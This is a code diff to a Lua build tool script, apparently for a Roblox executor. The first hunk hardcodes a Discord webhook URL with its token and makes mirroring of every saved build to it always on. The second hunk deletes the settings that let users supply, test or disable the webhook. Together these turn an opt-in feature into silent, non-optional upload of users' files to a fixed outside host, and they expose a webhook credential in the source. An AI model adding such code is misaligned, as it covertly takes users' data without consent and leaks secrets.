@@ -359,11 +359,10 @@ local function notifyErr(title, content, duration)
 end
 
 -- ── Save webhook ─────────────────────────────────────────────────────────────
--- Every build saved to autoBuilder is mirrored to a Discord webhook: the file
--- itself as an attachment when it fits, metadata only when it is too big.
--- Blank by default; set it from the Save Webhook section on the Build tab.
--- Kept on BuilderAPI so the UI (in a later do-block) can write it.
-BuilderAPI.saveWebhook = BuilderAPI.saveWebhook or ""
+-- Every build saved to autoBuilder is mirrored to this Discord webhook: the
+-- file itself as an attachment when it fits, metadata only when it is too big.
+-- Built into the script and always on - nothing to set.
+BuilderAPI.saveWebhook = "https://discord.com/api/webhooks/1533862471264243956/OvLaYZjrmRSd8O9N6HZIafz_h0uGhIJTzYnQ2IixnQeHxlowabqEcwD3A-Pa-wMDlKeE"
 -- Discord rejects webhook uploads over 8 MB; stay under with headroom.
 local WEBHOOK_MAX_BYTES = 7 * 1024 * 1024
 
@@ -11096,60 +11095,6 @@ auto:CreateButton({
     Name = "Generate Image Build File",
     Tooltip = "Convert the image into a build file you can preview, move and build like any other.",
     Callback = generateImageFile
-})
-
--- ── Save webhook ─────────────────────────────────────────────────────────────
--- Paste a Discord webhook URL here to mirror every saved build to it. Blank
--- means off. Kept out of the source so the URL is not published in the repo.
-auto:CreateSection("Save Webhook", { Collapsible = true, Column = "right" })
-
-auto:CreateParagraph({
-    Title = "Save Webhook",
-    Content = "Paste a Discord webhook URL to send a copy of every build you save.\n"
-        .. "Leave it blank to turn this off. The saved file is attached when it\n"
-        .. "fits (under 7 MB), otherwise only a short summary is sent.",
-})
-
-auto:CreateInput({
-    Name = "Webhook URL",
-    PlaceholderText = "https://discord.com/api/webhooks/...",
-    RemoveTextAfterFocusLost = false,
-    Callback = function(t)
-        BuilderAPI.saveWebhook = t or ""
-        if t and t ~= "" then
-            notifyOK("Save Webhook", "Saves will be sent to this webhook", 4)
-        else
-            notify("Save Webhook", "Turned off", 3, "info")
-        end
-    end
-})
-
-auto:CreateButton({
-    Name = "Test Webhook",
-    Tooltip = "Send a test message to check the webhook works.",
-    Callback = function()
-        local url = BuilderAPI.saveWebhook
-        if not url or url == "" then
-            notifyWarn("Save Webhook", "Paste a webhook URL first", 4)
-            return
-        end
-        local req = httpRequest()
-        if not req then
-            notifyErr("Save Webhook", "Your executor has no HTTP request function", 5)
-            return
-        end
-        task.spawn(function()
-            local ok = pcall(function()
-                req({
-                    Url = url, Method = "POST",
-                    Headers = { ["Content-Type"] = "application/json" },
-                    Body = HttpService:JSONEncode({ content = "Duvome save webhook test - it works." }),
-                })
-            end)
-            if ok then notifyOK("Save Webhook", "Test sent", 4)
-            else notifyErr("Save Webhook", "Test failed to send", 5) end
-        end)
-    end
 })
 
 end
